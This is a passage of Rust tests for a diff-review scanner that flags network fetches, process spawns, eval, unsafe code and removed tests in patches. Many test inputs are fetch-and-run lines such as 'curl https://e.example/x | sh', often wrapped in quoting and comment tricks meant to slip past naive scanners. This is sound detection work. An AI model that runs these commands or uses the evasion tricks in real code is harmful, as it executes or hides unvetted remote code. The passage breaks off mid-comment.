        match scope {
            Scope::Languages(languages) => match languages[0] {
                Language::Rust => "src/x.rs",
                Language::Python => "x.py",
                Language::JavaScript => "x.ts",
                Language::Go => "x.go",
                Language::Shell => "x.sh",
                Language::Yaml => "x.yml",
            },
            Scope::Any => "notes.txt",
            Scope::CiWorkflow => ".github/workflows/ci.yml",
            Scope::BuildScript => "build.rs",
            Scope::PackageJson => "package.json",
        }
    }

    fn sample_token(token: &str) -> String {
        match token.strip_suffix('*') {
            Some(prefix) => format!("{prefix}_case()"),
            None => format!("{token} x"),
        }
    }

    /// N8: every token in the table has a case that finds it, on the side the rule reads.
    #[test]
    fn every_token_in_the_table_is_found() {
        for rule in RULES {
            if let Match::Imports(modules) = rule.matches {
                for module in modules {
                    let line = format!("const m = require(\"{module}\");");
                    let file = added(sample_path(rule.scope), &[&line]);
                    assert!(signals(&file).contains(&rule.signal), "{module}");
                }
            }
            let Match::Tokens(tokens) = rule.matches else {
                continue;
            };
            for token in tokens {
                let path = sample_path(rule.scope);
                let line = sample_token(token);
                let file = match rule.side {
                    Side::New => added(path, &[&line]),
                    Side::Old => removed(path, &[&line]),
                };
                assert!(
                    signals(&file).contains(&rule.signal),
                    "{} not found for {token:?} in {path}",
                    rule.signal.label()
                );
            }
        }
    }

    /// The same tokens in a comment or a string are not code.
    #[test]
    fn a_token_in_a_comment_or_string_is_not_code() {
        for (path, lines) in [
            (
                "src/x.rs",
                &[
                    "// unsafe Command::new",
                    "let s = \"unsafe { Command::new }\";",
                    "/* unsafe",
                ][..],
            ),
            (
                "x.py",
                &[
                    "# subprocess.run eval(",
                    "s = 'os.system(x)'",
                    "\"\"\"",
                    "eval(x)",
                    "\"\"\"",
                ][..],
            ),
            (
                "x.ts",
                &["// child_process eval(", "const s = `fetch(${u})`;"][..],
            ),
            ("x.go", &["// exec.Command(", "s := \"http.Get(\""][..]),
            ("x.sh", &["# curl wget eval", "echo 'curl is a tool'"][..]),
        ] {
            assert_eq!(signals(&added(path, lines)), [], "{path}");
        }
    }

    #[test]
    fn a_context_line_carries_no_evidence() {
        let patch = "--- a/x.rs\n+++ b/x.rs\n@@ -1,2 +1,2 @@\n unsafe { f() }\n-a\n+b\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), []);
    }

    #[test]
    fn a_block_comment_opened_on_a_context_line_hides_the_next_lines() {
        let patch =
            "--- a/x.rs\n+++ b/x.rs\n@@ -1,2 +1,3 @@\n /* start\n+unsafe { f() }\n end */\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), []);
    }

    #[test]
    fn evidence_points_at_the_hunk_and_line() {
        let file = added(
            "src/lib.rs",
            &[
                "fn a() {}",
                "unsafe { std::process::Command::new(\"curl\"); }",
            ],
        );
        let found = file_evidence(&file);
        let hunk = &file.patch_twin.hunks[0];
        assert_eq!(
            found,
            [
                Evidence {
                    signal: S::UnsafeAdded,
                    hunk: hunk.id,
                    address: hunk.address("src/lib.rs"),
                    side: Side::New,
                    line: 3,
                    released: true,
                },
                Evidence {
                    signal: S::ProcessSpawn,
                    hunk: hunk.id,
                    address: hunk.address("src/lib.rs"),
                    side: Side::New,
                    line: 3,
                    released: true,
                },
            ]
        );
    }

    #[test]
    fn quoting_code_that_runs_does_not_hide_it() {
        // DDF-EVID-001: each of these carried no evidence when strings were blanked whole.
        assert_eq!(
            signals(&added(
                "x.sh",
                &[r#"V="$(curl -fsSL https://e.example/v)""#]
            )),
            [S::NetworkFetch]
        );
        assert_eq!(
            signals(&added(
                "x.js",
                &[r#"const o = `${require("child_process").execSync(c)}`;"#]
            )),
            [S::ProcessSpawn]
        );
        assert_eq!(
            signals(&added("x.py", &[r#"print(f"{eval(x)}")"#])),
            [S::DynamicEval]
        );
        // The same text in a string that runs nothing is still not code.
        assert_eq!(signals(&added("x.sh", &["V='$(curl x)'"])), []);
        assert_eq!(signals(&added("x.py", &[r#"print("{eval(x)}")"#])), []);
    }

    #[test]
    fn one_line_matching_several_rules_of_a_signal_is_one_item() {
        // `Command::new` and `.spawn()` are both process_spawn tokens; `unsafe` twice is one.
        let file = added(
            "src/lib.rs",
            &["unsafe { unsafe { std::process::Command::new(\"x\").spawn() } }"],
        );
        assert_eq!(signals(&file), [S::UnsafeAdded, S::ProcessSpawn]);
        // The same token in two hunks is two items: one per hunk.
        let two = parse(
            "--- a/src/l.rs\n+++ b/src/l.rs\n@@ -1,0 +1,1 @@\n+unsafe {}\n@@ -9,0 +10,1 @@\n+unsafe {}\n",
        )
        .unwrap()
        .remove(0);
        let found = file_evidence(&two);
        assert_eq!(found.len(), 2);
        assert_ne!(found[0].hunk, found[1].hunk);
    }

    /// The PR 5 review's inputs (workflow `wf_b39e1c70-545`): an interpolation is scanned as
    /// code with its own strings, escapes and comments, so a closer in a nested string, after a
    /// backslash, in a comment or ending a `case` pattern neither hides the code after it nor
    /// exposes the outer string's text.
    #[test]
    fn an_interpolation_is_scanned_as_code_with_its_own_strings() {
        let hidden_before: [(&str, &str, EvidenceSignal); 12] = [
            ("a.sh", r#"V="$(echo ')' ; curl x)""#, S::NetworkFetch),
            ("a.sh", r#"V="$(echo \) ; curl x)""#, S::NetworkFetch),
            (
                "a.sh",
                r#"V="$(case a in a) curl x;; esac)""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"X="$(tr -d ')' < f | curl https://e.example/x)""#,
                S::NetworkFetch,
            ),
            ("a.sh", r#"V="$(echo "$(curl x)")""#, S::NetworkFetch),
            (
                "a.js",
                r#"const o = `${ "}" + require("child_process").execSync(c) }`;"#,
                S::ProcessSpawn,
            ),
            ("a.js", "const o = `${ /* } */ eval(x) }`;", S::DynamicEval),
            ("a.js", "const o = `${ `${ eval(x) }` }`;", S::DynamicEval),
            ("a.py", r#"print(f"{'}' + eval(x)}")"#, S::DynamicEval),
            ("a.py", r#"print(Rf"{d['}'] or eval(x)}")"#, S::DynamicEval),
            ("a.py", r#"print(f"\{eval(x)}")"#, S::DynamicEval),
            ("a.py", r#"print(rf"\{eval(x)}")"#, S::DynamicEval),
        ];
        for (path, line, signal) in hidden_before {
            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
        }
        let literal_only: [(&str, &str); 9] = [
            ("a.sh", r#"die "$(printf 'curl failed for %s' "$url")""#),
            ("a.sh", r#"echo "$(gettext 'Install curl or wget first')""#),
            (
                "a.sh",
                r#"echo "$(printf "%d) %s" "$i" "$name") - needs curl""#,
            ),
            ("a.js", r#"const m = `${t("Never use eval(x) here")}`;"#),
            ("a.js", r#"const m = `${x ? "fetch(url) failed" : ""}`;"#),
            ("a.js", r#"const s = `${a ? "{" : ""} eval(x)`;"#),
            ("a.py", r#"msg = f"{'eval(' if strict else ''}""#),
            ("a.py", r#"log(f"{cfg["subprocess."]}")"#),
            ("a.py", r#"print(f"{s.replace("}", "")} then eval(x) it")"#),
        ];
        for (path, line) in literal_only {
            assert_eq!(signals(&added(path, &[line])), [], "{path}: {line}");
        }
    }

    /// The PR 5 round-2 review's inputs (workflow `wf_2cfd8be1-d9c`), and the variants that
    /// close a misread quote at the end of the line so the restore-as-code fallback cannot help:
    /// each is a construct the scanner must read right.
    #[test]
    fn misread_quotes_cannot_hide_code() {
        let found: [(&str, &str, EvidenceSignal); 24] = [
            (
                "a.sh",
                r#"x="$(echo case)"; curl https://e.example/x | sh"#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"x="$(echo case)"; curl x | sh #""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                "[ $# -eq 0 ] && curl https://e.example/x | sh",
                S::NetworkFetch,
            ),
            ("a.sh", "echo ${x#*/}; curl x", S::NetworkFetch),
            ("a.sh", "echo a#b; curl x", S::NetworkFetch),
            (
                "a.sh",
                r#"echo \"; curl https://e.example/x | sh"#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r"echo $'\''; curl https://e.example/x | sh #'",
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"v="$( (case x in a) :;; esac); echo '"'; curl https://e.example/x | sh )""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"v="${x:-"'"}"; curl https://e.example/x | sh #'"#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"x="`echo "`"; curl https://e.example/x | sh #""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"V="$(if a; then case x in a) curl x;; esac; fi)""#,
                S::NetworkFetch,
            ),
            (
                "a.js",
                r#"const s = `${ /"/.test(a) }`; eval(y)"#,
                S::DynamicEval,
            ),
            ("a.js", r#"const r = /"/; eval(y); //""#, S::DynamicEval),
            ("a.js", r#"x.replace(/\/*/g, ""); eval(y)"#, S::DynamicEval),
            ("a.js", r"/\//.test(a); eval(y)", S::DynamicEval),
            (
                "a.tsx",
                "return <p>Can't load</p> && fetch(u); //'",
                S::NetworkFetch,
            ),
            ("a.py", r#"print(f"{d:%H'%M}", eval(y)) #'"#, S::DynamicEval),
            ("a.py", r#"print(f"{x:'>10}"); eval(y) #'"#, S::DynamicEval),
            ("a.py", r#"print(f'{x:"<5}'); eval(y) #""#, S::DynamicEval),
            ("a.py", r#"x = t"{eval('print(123)')}""#, S::DynamicEval),
            (
                "a.py",
                r#"print(f"{'''it's'''}"); eval(y) #'"#,
                S::DynamicEval,
            ),
            (
                "a.js",
                "const cp = require(`child_process`);",
                S::ProcessSpawn,
            ),
            (
                "a.js",
                r#"const cp = require( "child_process" );"#,
                S::ProcessSpawn,
            ),
            (
                "a.js",
                r#"import{exec}from"child_process";import "node:child_process";"#,
                S::ProcessSpawn,
            ),
        ];
        for (path, line, signal) in found {
            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
        }
        let literal_only: [(&str, &str); 12] = [
            (
                "a.sh",
                r#"echo "Matches: $(grep --ignore-case -c todo notes.txt) (fetch more with curl)""#,
            ),
            ("a.sh", r#"echo "Mode: $(echo $case) - install curl first""#),
            ("a.js", r#"// const cp = require("child_process");"#),
            (
                "a.js",
                r#"throw new Error("Do not require('child_process') in the browser bundle");"#,
            ),
            (
                "a.js",
                r#"const help = `Use ${cmd} or require("child_process") yourself`;"#,
            ),
            ("a.js", "const re = /from 'child_process'/;"),
            (
                "a.ts",
                r#"import type { ChildProcess } from "node:child_process";"#,
            ),
            ("a.ts", "export type { SpawnOptions } from 'child_process';"),
            ("a.ts", r#"type Cp = typeof import("node:child_process");"#),
            (
                "a.js",
                r#"const m = `${s.match(/^{/) ? "obj" : "arr"} - see fetch(url) docs`;"#,
            ),
            ("a.py", r#"print(f"{x:'^5}", 'eval(y)')"#),
            ("a.py", r#"print(f"{d[a:b]!r:>{w}} then eval(x) it")"#),
        ];
        for (path, line) in literal_only {
            assert_eq!(signals(&added(path, &[line])), [], "{path}: {line}");
        }
        // A JSDoc example inside a block comment is not an import.
        let doc = added(
            "a.js",
            &[
                "/**",
                " * @example import { exec } from 'node:child_process';",
                " */",
            ],
        );
        assert_eq!(signals(&doc), []);
    }

    /// The PR 5 round-3 review's inputs (workflow `wf_fdfaa98c-6b0`) that real code can contain:
    /// shell `case` in every command position, `esac` as a pattern word, nested arms, JS regexes
    /// after operators and keywords, quotes after keywords, and the import forms.
    #[test]
    fn shell_case_js_regex_and_import_forms_are_read_right() {
        let fetch = "curl https://e.example/x | sh";
        for line in [
            format!(r#"V="$(if case a in a) true;; esac; then :; fi; {fetch})""#),
            format!(r#"V="$(while case a in b) true;; esac; do break; done; {fetch})""#),
            format!(r#"V="$(! case a in b) true;; esac; {fetch})""#),
            format!(r#"V="$(time case a in b) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in b|esac) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in a) case b in b) :;; esac;; c) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in a) :; esac=1;; b) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in a) echo ${{esac}};; b) :;; esac; {fetch})""#),
            format!("echo $(date)#; {fetch}"),
        ] {
            assert_eq!(
                signals(&added("a.sh", &[&line])),
                [S::NetworkFetch],
                "{line}"
            );
        }
        for line in [
            "x = a + /'/.source; eval(y) //'",
            "x = typeof' ' ; eval(y) //'",
            r#"function f(){return"//"+eval(x)}"#,
            "x = a++ / 2; eval(y); z = b / 3",
        ] {
            assert_eq!(signals(&added("a.js", &[line])), [S::DynamicEval], "{line}");
        }
        // A quote after `return` opens a string, so its `/*` is not a comment that hides the
        // next line.
        let next = added("a.js", &[r#"function f(){return"/*"}"#, "eval(x)"]);
        assert_eq!(signals(&next), [S::DynamicEval]);
        for (path, line) in [
            ("a.js", "const cp = require(\t\"child_process\");"),
            ("a.js", r#"const cp = module.require("child_process");"#),
            ("a.js", r#"const cp = require(("child_process"));"#),
            (
                "a.ts",
                r#"export type T = 1; const cp = require("child_process");"#,
            ),
            ("a.js", r#"const o = { m: import("child_process") };"#),
            // A type annotation loads nothing, but it is counted: the rule errs toward evidence.
            (
                "a.ts",
                r#"let p: import("child_process").ChildProcess | undefined;"#,
            ),
        ] {
            assert_eq!(signals(&added(path, &[line])), [S::ProcessSpawn], "{line}");
        }
        for line in [
            r#"echo "Ran: $(basename ${case}) - fetch the logs with curl""#,
            r#"echo "$(case $1 in (a) echo x;; esac) - install curl first""#,
        ] {
            assert_eq!(signals(&added("a.sh", &[line])), [], "{line}");
        }
    }

    /// The final PR 5 review's regressions against main (workflow `wf_bbb5e9f1-254`): common
    /// code the branch misread, and lines that made the import rule quadratic.
    #[test]
    fn common_typescript_continuations_and_raw_strings_keep_their_evidence() {
        for (path, line, signal) in [
            (
                "n.ts",
                "const pct = (stats.get(key)! / total) * 100; const res = await fetch(`/api/stats/${key}`);",
                S::NetworkFetch,
            ),
            (
                "n.ts",
                r#"const ms = timings[name]! / 1000; void fetch("/log", { method: "POST" });"#,
                S::NetworkFetch,
            ),
            (
                "n.ts",
                "const pct = done! / total; const out = execSync(`du -sh ${dir}/`);",
                S::ProcessSpawn,
            ),
            (
                "a.js",
                r"const run = cmd => /^'/.test(cmd) ? null : execSync(cmd, { shell: '/bin/sh' });",
                S::ProcessSpawn,
            ),
            (
                "src/a.rs",
                r#"let root = Path::new(r"C:\"); let out = Command::new("cmd").output()?;"#,
                S::ProcessSpawn,
            ),
            (
                "src/a.rs",
                r##"let s = r#"a "quoted" \"#; unsafe { f() }"##,
                S::UnsafeAdded,
            ),
            (
                "src/a.rs",
                r#"let b = br"\"; unsafe { f() }"#,
                S::UnsafeAdded,
            ),
        ] {
            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
        }
        // A line that continues an expression with `/` divides; one after `=` opens a regex.
        let divided = added(
            "m3.js",
            &[
                "const elapsed = (Date.now() - start)",
                "  / 1000; fetch(`/api/timing/${elapsed}`);",
            ],
        );
        assert_eq!(signals(&divided), [S::NetworkFetch]);
        let regex = added("m3.js", &["const re =", "  /fetch(/; const x = 1;"]);
        assert_eq!(signals(&regex), []);
        // A raw string's text is still text, and an ordinary string still escapes.
        assert_eq!(signals(&added("src/a.rs", &[r#"let s = r"unsafe";"#])), []);
        assert_eq!(signals(&added("src/a.rs", &[r#"let s = "\"unsafe";"#])), []);
    }

    #[test]
    fn the_import_rule_is_linear_on_long_lines() {
        within_deadline(|| {
            let start = ScanClock::start();
            for unit in [
                "Array.from(x),",
                "from ",
                "require ",
                "import ",
                "require(require(",
            ] {
                let line = unit.repeat(200_000);
                assert_eq!(signals(&added("a.js", &[&line])), [], "{unit}");
            }
            let spaced = format!(";{}from 'child_process'", " ".repeat(200_000));
            assert_eq!(signals(&added("a.js", &[&spaced])), [S::ProcessSpawn]);
            // Linear scans of these lines took about 2 s in a debug build; the quadratic import
            // rule of eee2b4c^ took about 66 s.
            let spent = start.elapsed();
            assert!(
                spent < std::time::Duration::from_secs(15),
                "the long lines took {spent:?} of {}",
                start.kind
            );
        });
    }

    /// The time a scan spends: the thread's own CPU time where Linux reports it, so a busy host
    /// does not fail the bound (a starved run measured 1.8 s of CPU in over 10 s of wall time),
    /// and wall time elsewhere.
    struct ScanClock {
        kind: &'static str,
        cpu_ns: Option<u64>,
        wall: std::time::Instant,
    }

    impl ScanClock {
        fn start() -> Self {
            let cpu_ns = thread_cpu_ns();
            #[expect(
                clippy::disallowed_methods,
                reason = "test door: the fallback clock where no CPU time is reported"
            )]
            let wall = std::time::Instant::now();
            let kind = if cpu_ns.is_some() {
                "thread CPU time"
            } else {
                "wall time"
            };
            Self { kind, cpu_ns, wall }
        }

        fn elapsed(&self) -> std::time::Duration {
            match (self.cpu_ns, thread_cpu_ns()) {
                (Some(then), Some(now)) => std::time::Duration::from_nanos(now - then),
                _ => self.wall.elapsed(),
            }
        }
    }

    /// The calling thread's CPU time in nanoseconds: the first field of Linux's
    /// `/proc/thread-self/schedstat`, or `None` where that file does not exist.
    fn thread_cpu_ns() -> Option<u64> {
        let stat = std::fs::read_to_string("/proc/thread-self/schedstat").ok()?;
        stat.split_whitespace().next()?.parse().ok()
    }

    /// Run `work` on its own thread and fail if it takes more than two minutes of wall time.
    /// This bound only keeps a hang from stalling the suite, so a diff-mutation run reports a
    /// looping mutant as caught rather than as a timeout; the scan's cost is bounded by
    /// [`ScanClock`] inside the work.
    fn within_deadline<T: Send + 'static>(work: impl FnOnce() -> T + Send + 'static) -> T {
        let (done, wait) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let _ = done.send(work());
        });
        wait.recv_timeout(std::time::Duration::from_secs(120))
            .expect("a long line was scanned within two minutes")
    }

    /// The import rule's receiver, boundary, `typeof` and statement decisions, each pinned.
    #[test]
    fn import_rule_decisions_are_exact() {
        for (line, spawn) in [
            (r#"const cp = foo.require("child_process");"#, false),
            (r#"const cp = requirex("child_process");"#, false),
            (r#"const t = typeof require("child_process");"#, true),
            (
                r#"x = Array.from(y); import type {A} from "child_process";"#,
                false,
            ),
            (
                r#"x = Array.from(y); import {A} from "child_process";"#,
                true,
            ),
        ] {
            let expected: &[EvidenceSignal] = if spawn { &[S::ProcessSpawn] } else { &[] };
            assert_eq!(signals(&added("a.ts", &[line])), expected, "{line}");
        }
    }

    #[test]
    fn child_process_imports_are_spawn_evidence() {
        for line in [
            r#"const cp = require("child_process");"#,
            "import { execFile } from 'node:child_process';",
            r#"const { spawn } = await import("child_process");"#,
        ] {
            assert_eq!(
                signals(&added("a.js", &[line])),
                [S::ProcessSpawn],
                "{line}"
            );
        }
        // Naming another module, or the name alone in a message, is not.
        assert_eq!(
            signals(&added("a.js", &[r#"log("child process done")"#])),
            []
        );
    }

    #[test]
    fn removed_tests_are_read_on_the_old_side() {
        let file = removed("src/x.rs", &["#[test]", "fn t() {}"]);
        let found = file_evidence(&file);
        assert_eq!(found.len(), 1);
        assert_eq!(
            (found[0].signal, found[0].side, found[0].line),
            (S::TestRemoved, Side::Old, 2)
        );
        // Adding a test is not evidence of anything.
        assert_eq!(signals(&added("src/x.rs", &["#[test]"])), []);
    }

    /// Until 2026-11-14 the Rust code view ended a block comment at the first `*/` and lost
    /// step after a character literal with a long escape, so a removed test behind either was
    /// not read (the published v0.8.3 binary reports nothing for these two hunks). The
    /// compiler nests the comment and reads the literal whole, and so does the view now.
    #[test]
    fn a_removed_test_behind_a_nested_comment_or_a_long_escape_is_found() {
        let cases: [(&[&str], u32); 2] = [
            (&["/* /* */ // */ #[test]", "fn t() {}"], 2),
            (&[r#"let _ = ('\x41','"', "/*");"#, "#[test]"], 3),
        ];
        for (lines, line) in cases {
            let found: Vec<_> = file_evidence(&removed("src/x.rs", lines))
                .iter()
                .map(|e| (e.signal, e.side, e.line))
                .collect();
            assert_eq!(found, [(S::TestRemoved, Side::Old, line)], "{lines:?}");
        }
    }

    /// What 0.8.3 found in Rust is found, whatever else is. A hunk can start inside a string or
    /// a comment opened above it, and then neither reading of Rust is the compiler's: each can
    /// come back to code where the other does not. Each patch below is one where the reading
    /// of 0.8.3 finds real code and the lexer reading alone finds nothing (measured on the
    /// published v0.8.3 binary: the items expected here, and scores 6, 5, 6 and 5).
    /// - A list kept in a string, with a glob of two wildcard directories: `/*`, `/*` and
    ///   `*/` to a reader that started in code. The reading of 0.8.3 ends its comment at the
    ///   `*/`; the nesting reading is still one deep at the end of the hunk. `git diff`
    ///   writes this hunk for a function added below such a list.
    /// - The same list above a removed test, for the old side.
    /// - Shell text in a raw string with an apostrophe before a quote: the lexer reading
    ///   takes `'\t"%s\n'` for a character literal, and the closing `"#` then opens a string.
    /// - Two added lines of a `build.rs` that hold nothing but a character literal with a
    ///   long escape and one of several bytes: blank to the lexer reading, not to 0.8.3's.
    #[test]
    fn what_the_reading_of_0_8_3_finds_from_an_unknown_start_is_found() {
        let glob = "--- a/src/main.rs\n+++ b/src/main.rs\n@@ -8,6 +8,10 @@\n     LICENSE\n     \
                    crates/*/*/Cargo.toml\n     docs/README.md\n \";\n \n+pub fn run(cmd: &str) \
                    -> bool {\n+    std::process::Command::new(\"sh\").arg(cmd).status().is_ok()\
                    \n+}\n+\n fn main() {\n";
        let removed_test = "--- a/src/main.rs\n+++ b/src/main.rs\n@@ -8,10 +8,6 @@\n     \
                            LICENSE\n     crates/*/*/Cargo.toml\n     docs/README.md\n \";\n \n\
                            -#[test]\n-fn patterns_are_checked() {\n-    \
                            assert!(PATTERNS.lines().count() > 3);\n-}\n fn main() {\n";
        let apostrophe = "--- a/src/main.rs\n+++ b/src/main.rs\n@@ -8,8 +8,8 @@\n     set -eu\n     \
                          cd \"$1\"\n     make\n-    printf done\n-\"#; pub fn f() { g() }\n\
                          +    printf '\\t\"%s\\n' done\n+\"#; pub fn f() { unsafe { \
                          hint2::run(g) } }\n \n \n mod hint2 { pub unsafe fn run(f: fn()) { f() } }\n";
        let build = "--- a/build.rs\n+++ b/build.rs\n@@ -3,2 +3,4 @@\n const T: [char; 2] = [\n\
                     +'\\x41'\n+'é'\n     ];\n";
        let cases: [(&str, &[Found]); 4] = [
            (glob, &[(S::ProcessSpawn, Side::New, 14)]),
            (removed_test, &[(S::TestRemoved, Side::Old, 13)]),
            (apostrophe, &[(S::UnsafeAdded, Side::New, 12)]),
            (
                build,
                &[(S::BuildHook, Side::New, 4), (S::BuildHook, Side::New, 5)],
            ),
        ];
        for (patch, expected) in cases {
            let file = parse(patch).unwrap().remove(0);
            let items = |views_of| -> Vec<Found> {
                let kind = FileKind::of(&file);
                let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
                hunk_matches_in(&file.patch_twin.hunks[0], kind.language, &rules, views_of)
                    .into_iter()
                    .map(|(side, signal, line)| (signal, side, line))
                    .collect()
            };
            assert_eq!(items(code_views), expected, "{patch}");
            assert_eq!(items(legacy_alone), expected, "0.8.3's reading: {patch}");
            assert_eq!(items(lexer_alone), [], "the lexer reading: {patch}");
            let found: Vec<_> = file_evidence(&file)
                .iter()
                .map(|e| (e.signal, e.side, e.line))
                .collect();
            assert_eq!(found, expected, "{patch}");
        }
    }

    /// An item as the tests of the two readings compare it.
    type Found = (S, Side, u32);

    /// The first view of a line alone: for Rust, the reading of 0.8.3.
    fn legacy_alone(language: Language, line: &str, state: &mut Readings) -> Vec<String> {
        let mut views = code_views(language, line, state);
        views.truncate(1);
        views
    }

    /// The list 0.8.3 would print for `file`: what its reading alone finds in each hunk, in the
    /// order of the file, cut at the bound.
    fn listed_by_0_8_3(file: &ReviewFile) -> Vec<Found> {
        let kind = FileKind::of(file);
        let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
        file.patch_twin
            .hunks
            .iter()
            .flat_map(|hunk| hunk_matches_in(hunk, kind.language, &rules, legacy_alone))
            .map(|(side, signal, line)| (signal, side, line))
            .take(MAX_EVIDENCE_PER_FILE)
            .collect()
    }

    /// What the bounded list of `file` must hold, whatever further readings find: every item
    /// 0.8.3 would list; as many items as the bound allows; in the order of the file; and it
    /// says so when there is more. Returns whether the list is cut, and how many of the items
    /// 0.8.3 would list a cut after the first 32 items of all readings would have dropped.
    fn bounded_list_holds(file: &ReviewFile, text: &str) -> (bool, usize) {
        let all = file_evidence(file);
        let ranked = crate::rank::RankedFile::scored(file);
        let found = |e: &Evidence| (e.signal, e.side, e.line);
        let listed: Vec<Found> = ranked.evidence.iter().map(found).collect();
        let by_0_8_3 = listed_by_0_8_3(file);
        for item in &by_0_8_3 {
            assert!(listed.contains(item), "0.8.3 lists {item:?}:\n{text}");
        }
        assert_eq!(listed.len(), all.len().min(MAX_EVIDENCE_PER_FILE), "{text}");
        assert_eq!(ranked.evidence_truncated, all.len() > MAX_EVIDENCE_PER_FILE);
        let mut rest = all.iter();
        for item in &ranked.evidence {
            assert!(
                rest.any(|e| e == item),
                "not in the order of the file:\n{text}"
            );
        }
        let first: Vec<Found> = all.iter().take(MAX_EVIDENCE_PER_FILE).map(found).collect();
        let dropped = by_0_8_3.iter().filter(|item| !first.contains(item)).count();
        (ranked.evidence_truncated, dropped)
    }

    /// At the bound of 32 the list still holds what 0.8.3 listed. For generated Rust files of
    /// 40 to 120 changed lines, heavy with rule tokens and with the pieces the readings
    /// disagree about (as a new file, as added lines and as removed lines): the list 0.8.3
    /// would print, which is its reading alone cut at 32, is contained in the list printed;
    /// the list is as long as the bound allows and in the order of the file; and an item is
    /// marked released exactly when the reading of 0.8.3 alone finds it. Many of these lists
    /// are cut, and in many a cut after the first 32 items of all readings would have dropped
    /// an item 0.8.3 listed.
    #[test]
    fn the_bounded_list_holds_every_item_0_8_3_listed() {
        use std::fmt::Write as _;
        const ATOMS: [&str; 14] = [
            "unsafe { g() }",
            "std::process::Command::new(\"sh\")",
            "reqwest::blocking::get(u)",
            "#[test]",
            "/* /* */ // */ ",
            "('\\x41','\"', \"/*\"); ",
            "/*",
            "*/",
            "\"",
            "'",
            "x",
            " ",
            "// */",
            "crates/*/*/Cargo.toml",
        ];
        let mut seed = 0x1234_5678_9ABC_DEF1_u64;
        let mut next = move |below: usize| {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            usize::try_from(seed % (below as u64)).unwrap()
        };
        let (mut cut, mut would_drop) = (0, 0);
        for case in 0..400 {
            let count = 40 + next(81);
            let sign = if case % 3 == 2 { '-' } else { '+' };
            let mut body = String::new();
            for _ in 0..count {
                // Mostly a rule token alone; often behind the nested comment, which hides
                // it from the reading of 0.8.3 only; now and then one of the other pieces.
                let before = match next(40) {
                    0 => ATOMS[5],
                    1 => ATOMS[6 + next(8)],
                    2..=11 => ATOMS[4],
                    _ => "",
                };
                let _ = writeln!(body, "{sign}{before}{}", ATOMS[next(4)]);
            }
            let text = match case % 3 {
                0 => format!("--- /dev/null\n+++ b/src/x.rs\n@@ -0,0 +1,{count} @@\n{body}"),
                1 => format!(
                    "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -1,1 +1,{} @@\n x\n{body}",
                    count + 1
                ),
                _ => format!(
                    "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -1,{} +1,1 @@\n x\n{body}",
                    count + 1
                ),
            };
            let file = parse(&text).unwrap().remove(0);
            let (is_cut, dropped) = bounded_list_holds(&file, &text);
            cut += usize::from(is_cut);
            would_drop += usize::from(dropped > 0);
            // An item is released exactly when the reading of 0.8.3 alone finds it.
            let kind = FileKind::of(&file);
            let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
            let hunk = &file.patch_twin.hunks[0];
            let alone = hunk_matches_in(hunk, kind.language, &rules, legacy_alone);
            for item in file_evidence(&file) {
                assert_eq!(
                    item.released,
                    alone.contains(&(item.side, item.signal, item.line)),
                    "{item:?}:\n{text}"
                );
            }
        }
        assert!(
            cut > 100 && would_drop > 30,
            "{cut} lists cut, {would_drop} where a plain cut would have dropped an item of 0.8.3"
        );
    }

    /// The last view of a line alone: for Rust, the lexer reading.
    fn lexer_alone(language: Language, line: &str, state: &mut Readings) -> Vec<String> {
        let mut views = code_views(language, line, state);
        views.drain(..views.len() - 1);
        views
    }

    /// `'r#r"\"` is read by each reading as its editions read it, and the rules read both: the
    /// text written for editions 2015 and 2018 is found by the reading of 0.8.3 (as 0.8.3
    /// found it), the text written for 2021 and 2024 by the lexer reading (0.8.3 missed it).
    #[test]
    fn a_raw_lifetime_before_a_string_hides_nothing_in_any_edition() {
        for (line, by_legacy, by_lexer) in [
            (
                r#"m!('r#r"\"); let s = std::process::Command::new("sh").status(); m!("");"#,
                true,
                false,
            ),
            (
                r#"m!('r#r"\" /* "); let s = std::process::Command::new("sh").status(); m!(" */ ");"#,
                false,
                true,
            ),
        ] {
            let file = added("src/x.rs", &[line]);
            assert_eq!(signals(&file), [S::ProcessSpawn], "{line}");
            let kind = FileKind::of(&file);
            let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
            let hunk = &file.patch_twin.hunks[0];
            for (views_of, finds) in [
                (legacy_alone as fn(_, &str, &mut _) -> _, by_legacy),
                (lexer_alone, by_lexer),
            ] {
                let found = hunk_matches_in(hunk, kind.language, &rules, views_of);
                assert_eq!(!found.is_empty(), finds, "{line}");
            }
        }
    }

    /// No answer is lower than 0.8.3's, by construction, and this holds the construction: for
    /// Rust text of every shape a hunk can have, what the rules find is what the reading of
    /// 0.8.3 finds together with what the lexer reading finds, each read alone. Nothing the
    /// first finds is missing, and nothing is found that neither finds (their bytes are never
    /// mixed into a view of their own). The reading of 0.8.3 is the shared scanner's, whose
    /// code is the released code (`lexical.rs` differs from the release by added lines only),
    /// and it carries a state the other reading never touches. A file's score adds a weight of
    /// at least 1 for each signal found, so it is never lower either.
    ///
    /// The text is made from the pieces the two readings disagree about (quotes, comment
    /// openers and closers, character literals with long escapes, raw strings and prefixes)
    /// with rule tokens between them, as a new file, as added lines below a context line, as
    /// removed lines, and as a mix of context, added and removed lines, on a source path and
